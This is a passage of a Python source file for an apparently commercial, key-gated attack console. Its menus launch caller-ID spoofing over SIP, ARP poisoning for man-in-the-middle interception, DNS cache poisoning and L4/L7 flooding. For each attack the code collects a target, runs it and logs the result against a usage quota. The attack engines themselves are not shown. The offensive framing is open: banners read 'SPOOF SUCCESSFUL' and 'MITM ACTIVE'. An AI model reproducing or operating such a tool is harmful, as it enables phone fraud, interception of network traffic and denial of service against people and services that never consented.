    caller_id = prompt("Caller ID to spoof (Enter = random): ", "Random")

    # ── SIP config ────────────────────────────────────────────────────
    use_preset = prompt("Use default SIP provider? y/N: ", "n")
    if use_preset.lower() != "y":
        sip_user = prompt("SIP username: ")
        sip_pass = prompt("SIP password: ", secret=True)
        sip_host = prompt("SIP server [sip.spoofwave.com]: ", "sip.spoofwave.com")
        sip_port = int(prompt("SIP port [5060]: ", "5060"))
        sip_cfg = {"user": sip_user, "secret": sip_pass,
                   "host": sip_host, "port": sip_port}
    else:
        sip_cfg = DEFAULT_SIP.copy()
        c.print(f"[{C['text']}]Using: {sip_cfg['user']}@{sip_cfg['host']}:{sip_cfg['port']}[/]")

    
    c.print(f"\n[{C['dim']}]Initiating SIP call...[/]")
    caller = SIPCaller()
    result = caller.place_call(target, caller_id, sip_cfg)

    # ── Show protocol flow ────────────────────────────────────────────
    c.print()
    show_protocol_flow(result.get("flow", []))

    # ── Final result ──────────────────────────────────────────────────
    if result["success"]:
        c.print(f"\n[{C['success']}]✔ SPOOF SUCCESSFUL[/]")
        c.print(f"[{C['dim']}]Call-ID: {result.get('call_id', 'N/A')}[/]")
        c.print(f"[{C['dim']}]Display: {result.get('display', 'N/A')}[/]")
    else:
        c.print(f"\n[{C['fail']}]✘ SPOOF FAILED[/]")
        c.print(f"[{C['dim']}]Reason: {result.get('reason', 'Unknown')}[/]")

    SESSION.log(f"VOIP {'SUCCESS' if result['success'] else 'FAIL'} | "
                f"target={target} | CID={caller_id}")
    SESSION.use()
    press_enter()


def menu_arp():
    if SESSION.exhausted:
        c.print(f"\n[{C['warn']}]Usage limit reached[/]")
        press_enter()
        return

    show_banner()
    c.print(Panel("[bold]ARP SPOOFER — Layer 2 MITM[/]",
                  style=C["gold"], padding=(1, 2)))

    target = prompt("Target IP [192.168.1.100]: ", "192.168.1.100")
    gateway = prompt("Gateway IP [192.168.1.1]: ", "192.168.1.1")

    spoofer = ARPSpoofer()
    result = spoofer.poison(target, gateway)

    c.print()
    show_protocol_flow(result.get("flow", []))

    if result["success"]:
        c.print(f"\n[{C['success']}]✔ MITM ACTIVE[/]")
        c.print(f"[{C['dim']}]Attacker MAC: {result.get('attacker_mac', 'N/A')}[/]")
        c.print(f"[{C['dim']}]Target → Gateway now passes through attacker[/]")
    else:
        c.print(f"\n[{C['fail']}]✘ SPOOF FAILED[/]")
        c.print(f"[{C['dim']}]Reason: {result.get('reason', 'Unknown')}[/]")

    SESSION.log(f"ARP {'SUCCESS' if result['success'] else 'FAIL'} | "
                f"target={target} gateway={gateway}")
    if result["success"]:
        SESSION.use()
    press_enter()


def menu_dns():
    if SESSION.exhausted:
        c.print(f"\n[{C['warn']}]Usage limit reached[/]")
        press_enter()
        return

    show_banner()
    c.print(Panel("[bold]DNS SPOOFER — Cache Poisoning[/]",
                  style=C["purple"], padding=(1, 2)))

    domain = prompt("Target domain (e.g., example.com): ")
    if not domain:
        c.print(f"[{C['fail']}]No domain entered[/]")
        press_enter()
        return

    spoof_ip = prompt("Spoof to IP [127.0.0.1]: ", "127.0.0.1")
    spoofer = DNSSpoofer()
    result = spoofer.spoof(domain, spoof_ip)

    c.print()
    show_protocol_flow(result.get("flow", []))

    if result["success"]:
        c.print(f"\n[{C['success']}]✔ DNS POISONED[/]")
    else:
        c.print(f"\n[{C['fail']}]✘ DNS SPOOF FAILED[/]")
        c.print(f"[{C['dim']}]Reason: {result.get('reason', 'Unknown')}[/]")

    SESSION.log(f"DNS {'SUCCESS' if result['success'] else 'FAIL'} | "
                f"{domain} → {spoof_ip}")
    if result["success"]:
        SESSION.use()
    press_enter()


def menu_dos():
    if SESSION.exhausted:
        c.print(f"\n[{C['warn']}]Usage limit reached[/]")
        press_enter()
        return

    show_banner()
    c.print(Panel("[bold]DOS ENGINE — Stress Testing[/]",
                  style=C["fail"], padding=(1, 2)))

    layer = prompt("Layer [7|4]: ", "7")
    target = prompt("Target (URL for L7, IP for L4): ")
    if not target:
        c.print(f"[{C['fail']}]No target entered[/]")
        press_enter()
        return

    duration = int(prompt("Duration (seconds) [30]: ", "30"))

    if layer == "4":
        port = int(prompt("Port [80]: ", "80"))
        proto = prompt("Protocol [TCP]: ", "TCP").upper()

        engine = DOSEngine()
        result = engine.l4_flood(target, port, proto, duration)
    else:
        engine = DOSEngine()
        result = engine.l7_flood(target, duration)

    if "error" in result:
        c.print(f"\n[{C['fail']}]✘ ERROR: {result['error']}[/]")
    else:
        c.print(f"\n[{C['success']}]✔ ATTACK COMPLETE[/]")
        sent = result.get("sent", 0)
        errors = result.get("errors", 0)
        rate = result.get("success_rate", 0)
        c.print(f"[{C['dim']}]Sent: {sent:,} | Errors: {errors:,}[/]")
        if rate:
            c.print(f"[{C['dim']}]Success rate: {rate:.1f}%[/]")

        for entry in result.get("flow", []):
            if len(entry) >= 2:
                c.print(f"[{C[{'DONE': 'success', 'WARN': 'warn', 'ATTACK': 'fail', 'CHECK': 'dim', 'OK': 'success', 'SPOOF': 'warn', 'RESOLVE': 'dim'}.get(entry[0], C['text'])]}]{entry[1]}[/]")

    SESSION.log(f"DoS L{layer} | target={target} | duration={duration}s")
    SESSION.use()
    press_enter()


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN LOOP
# ═══════════════════════════════════════════════════════════════════════════

def login_screen():
    while True:
        show_banner()
        c.print(Panel("[bold]AUTHENTICATION REQUIRED[/]", style=C["accent"], padding=(1, 2)))

        for _ in range(3):
            key = prompt("Access key: ")
            if SESSION.authenticate(key):
                c.print(f"\n[{C['success']}]✓ Authenticated as {SESSION.user.upper()}[/]")
                time.sleep(1.5)
                return True

            c.print(f"[{C['fail']}]Invalid key ({2 - _} attempts remaining)[/]")

        c.print(f"\n[{C['fail']}]ACCESS DENIED[/]")
        sys.exit(1)


def main_menu():
    while True:
        show_banner()

        # Status bar
        remaining = SESSION.remaining
        total = USERS[SESSION.user]["limit"]
        pct = max(0, min(100, int(100 * SESSION.count / total))) if total else 0
        c.print(f"[{C['hl']}]User:[/] [{C['accent']}]{SESSION.user.upper()}[/]  "
                f"[{C['hl']}]Usage:[/] [{C['dim']}]{SESSION.count}[/]"
                f"[{C['dim']}]/[/][{C['text']}]{total}[/]  "
                f"[{C['hl']}]Remaining:[/] [{C['success'] if remaining > 100 else C['warn']}]{remaining}[/]  "
                f"[{C['dim']}]({pct}%)[/]",
                justify="center")
        c.print()

        # Menu
        menu = Table(box=box.SIMPLE, show_header=False, expand=False, padding=(0, 4))
        menu.add_column("Option", style=C["accent"])
        menu.add_column("Module", style=C["hl"])
        menu.add_column("Description", style=C["dim"])

        menu.add_row("[1]", "VoIP Spoofer",   "SIP call with spoofed caller ID")
        menu.add_row("[2]", "ARP Spoofer",    "Layer 2 MITM cache poisoning")
        menu.add_row("[3]", "DNS Spoofer",    "DNS cache poisoning / response forgery")
        menu.add_row("[4]", "DoS Engine",     "L4/L7 stress testing (powerful)")
        menu.add_row("[0]", "Exit",           "Terminate session")

        c.print(menu, justify="center")
        c.print()

        choice = prompt("Select [1]: ", "1")

        if choice == "1":
            menu_voip()
        elif choice == "2":
            menu_arp()
        elif choice == "3":
            menu_dns()
        elif choice == "4":
            menu_dos()
        elif choice == "0":
            # Cleanup
            if os.path.exists(STATE_FILE):
                os.remove(STATE_FILE)
            c.print(f"\n[{C['fail']}]Session terminated[/]")
            break
        else:
            c.print(f"[{C['warn']}]Invalid option[/]")


def main():
    try:
        if SESSION.user is None:
            login_screen()
        main_menu()
    except KeyboardInterrupt:
        c.print(f"\n[{C['warn']}]Interrupted[/]")
        sys.exit(0)


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()